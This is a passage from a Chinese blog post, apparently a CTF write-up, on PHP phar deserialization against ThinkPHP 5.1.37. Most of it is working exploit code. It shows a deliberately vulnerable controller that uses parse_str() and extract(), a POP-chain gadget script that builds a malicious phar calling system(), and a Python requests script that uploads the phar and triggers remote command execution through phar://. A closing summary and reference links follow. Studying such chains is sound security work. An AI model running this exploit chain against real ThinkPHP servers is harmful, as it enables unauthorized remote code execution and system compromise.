class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">app</span>\\<span class=\"title class_\">index</span>\\<span class=\"title class_\">controller</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">think</span>\\<span class=\"title\">Controller</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Index</span> <span class=\"keyword\">extends</span> <span class=\"title\">controller</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">index</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px;&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V5.1&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;12载初心不改（2006-2018） - 你值得信赖的PHP框架&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=64890268&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;eab4b9f840753f8e7&quot;&gt;&lt;/think&gt;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hello</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">        <span class=\"variable\">$hello</span> = <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"string\">&#x27;Welcome to D0g3&#x27;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;hello&#x27;</span>])||<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;hello&#x27;</span>])) <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;world&#x27;</span>]))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">parse_str</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;world&#x27;</span>],<span class=\"variable\">$haha</span>);</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">extract</span>(<span class=\"variable\">$haha</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>(<span class=\"variable\">$a</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$a</span> = <span class=\"string\">&#x27;hello.txt&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"variable\">$s</span> = <span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$hello</span>);</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"string\">&#x27;hello.txt&#x27;</span>, <span class=\"variable\">$s</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$a</span>))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> (<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$a</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>parse_str()和extract()使得我们可以通过变量覆盖完成文件写入与任意读取，并且$a可以使用伪协议。那么接下来的事情就理所应当了：往hello.txt里写入一个phar，metadata里面放ThinkPHP 5.1.37 的反序列化利用链，完成RCE.(关于这个POP链的原理请参阅<a href=\"https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp-5.1.37-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html\">https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-反序列化漏洞/Thinkphp-5.1.37-反序列化漏洞.html</a> 讲的很详细)</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">think</span>&#123;</span><br><span class=\"line\">    <span class=\"title class_\">abstract</span> <span class=\"title class_\">class</span> <span class=\"title class_\">Model</span>&#123;</span><br><span class=\"line\">        <span class=\"title class_\">protected</span> $<span class=\"title class_\">append</span> = [];</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"variable\">$data</span> = [];</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;append = [<span class=\"string\">&quot;ethan&quot;</span>=&gt;[<span class=\"string\">&quot;godspeedyyds&quot;</span>,<span class=\"string\">&quot;xtxyyds&quot;</span>]];</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;data = [<span class=\"string\">&quot;ethan&quot;</span>=&gt;<span class=\"keyword\">new</span> <span class=\"title class_\">Request</span>()];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Request</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$hook</span> = [];</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$filter</span> = <span class=\"string\">&quot;system&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$config</span> = [</span><br><span class=\"line\">            <span class=\"string\">&#x27;var_method&#x27;</span>       =&gt; <span class=\"string\">&#x27;_method&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;var_ajax&#x27;</span>         =&gt; <span class=\"string\">&#x27;_ajax&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;var_pjax&#x27;</span>         =&gt; <span class=\"string\">&#x27;_pjax&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class=\"string\">&#x27;s&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [</span><br><span class=\"line\">                <span class=\"string\">&#x27;ORIG_PATH_INFO&#x27;</span>,</span><br><span class=\"line\">                <span class=\"string\">&#x27;REDIRECT_PATH_INFO&#x27;</span>,</span><br><span class=\"line\">                <span class=\"string\">&#x27;REDIRECT_URL&#x27;</span></span><br><span class=\"line\">            ],</span><br><span class=\"line\">            <span class=\"string\">&#x27;default_filter&#x27;</span>   =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;url_domain_root&#x27;</span>  =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;https_agent_name&#x27;</span> =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class=\"string\">&#x27;HTTP_X_REAL_IP&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class=\"string\">&#x27;html&#x27;</span>,</span><br><span class=\"line\">        ];</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$param</span> = [<span class=\"string\">&#x27;cat /y0u_f0und_It&#x27;</span>];</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;filter = <span class=\"string\">&quot;system&quot;</span>;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;config = [<span class=\"string\">&quot;var_ajax&quot;</span>=&gt;<span class=\"string\">&#x27;&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;hook = [<span class=\"string\">&quot;visible&quot;</span>=&gt;[<span class=\"variable language_\">$this</span>,<span class=\"string\">&quot;isAjax&quot;</span>]];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">process</span>\\<span class=\"title class_\">pipes</span>&#123;</span><br><span class=\"line\">    <span class=\"title class_\">use</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">model</span>\\<span class=\"title class_\">concern</span>\\<span class=\"title class_\">Conversion</span>;</span><br><span class=\"line\">    <span class=\"keyword\">use</span> <span class=\"title\">think</span>\\<span class=\"title\">model</span>\\<span class=\"title\">Pivot</span>;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Windows</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"variable\">$files</span> = [];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;files = [<span class=\"keyword\">new</span> <span class=\"title class_\">Pivot</span>()];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">model</span>&#123;</span><br><span class=\"line\">    <span class=\"title class_\">use</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">Model</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Pivot</span> <span class=\"keyword\">extends</span> <span class=\"title\">Model</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span>&#123;</span><br><span class=\"line\">    <span class=\"title class_\">use</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">process</span>\\<span class=\"title class_\">pipes</span>\\<span class=\"title class_\">Windows</span>;</span><br><span class=\"line\">    <span class=\"variable\">$w</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Windows</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$p</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Phar</span>(<span class=\"string\">&#x27;phar.phar&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$p</span>-&gt;<span class=\"title function_ invoke__\">startBuffering</span>();</span><br><span class=\"line\">    <span class=\"variable\">$p</span>-&gt;<span class=\"title function_ invoke__\">setStub</span>(<span class=\"string\">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$p</span>-&gt;<span class=\"title function_ invoke__\">setMetadata</span>(<span class=\"variable\">$w</span>);</span><br><span class=\"line\">    <span class=\"variable\">$p</span>-&gt;<span class=\"title function_ invoke__\">addFromString</span>(<span class=\"string\">&quot;test&quot;</span>, <span class=\"string\">&quot;12345&quot;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$p</span>-&gt;<span class=\"title function_ invoke__\">stopBuffering</span>();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>执行后生成phar，然后执行脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.parse</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;phar.phar&#x27;</span>,<span class=\"string\">&#x27;rb&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    s = f.read()</span><br><span class=\"line\"></span><br><span class=\"line\">s = urllib.parse.quote(base64.b64encode(s).decode())</span><br><span class=\"line\"><span class=\"comment\"># print(s)</span></span><br><span class=\"line\">remote = <span class=\"string\">&#x27;&lt;here_is_remote_ip&gt;&#x27;</span></span><br><span class=\"line\">sess =requests.session()</span><br><span class=\"line\">r = sess.post(</span><br><span class=\"line\">    url = <span class=\"string\">f&#x27;http://<span class=\"subst\">&#123;remote&#125;</span>/index.php/index/index/hello&#x27;</span>,</span><br><span class=\"line\">    params=&#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;ethan&#x27;</span>:<span class=\"string\">&#x27;&lt;here_is_your_shell_command&gt;&#x27;</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    data = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;world&#x27;</span>:<span class=\"string\">f&#x27;hello=<span class=\"subst\">&#123;s&#125;</span>&amp;a=phar://./hello.txt&#x27;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(r.text)</span><br></pre></td></tr></table></figure>\n\n<p>成功RCE</p>\n<hr>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>phar反序列化提供了一种扩展反序列化漏洞攻击面的方式、入口，所以基于unserialize()函数的各类攻击tricks（比如引用绕过之类的）依然适用。鉴于phar反序列化漏洞设计版本较多，相信CTF比赛中它仍然会稳定出场。</p>\n<hr>\n<p>参考资料：</p>\n<p><a href=\"https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp-5.1.37-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html\">Thinkphp-5.1.37-反序列化漏洞</a></p>\n<p><a href=\"https://www.php.net/manual/zh/class.phar.php\">https://www.php.net/manual/zh/class.phar.php</a></p>\n<p><a href=\"https://blog.csdn.net/lllffg/article/details/116145918\">Thinkphp 5.1.37反序列化漏洞</a></p>\n<p><a href=\"https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf\">us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It</a></p>\n<p><a href=\"https://github.dev/php/php-src\">https://github.dev/php/php-src</a></p>\n<p><a href=\"https://www.webhek.com/post/packaging-your-php-apps-with-phar.html\">packaging-your-php-apps-with-phar</a></p>\n<p><a href=\"https://www.freebuf.com/articles/web/205943.html\">PHAR反序列化拓展操作总结</a></p>\n",
            "tags": [
                "Phar",
                "反序列化",
                "PHP"
            ]
        }
    ]
}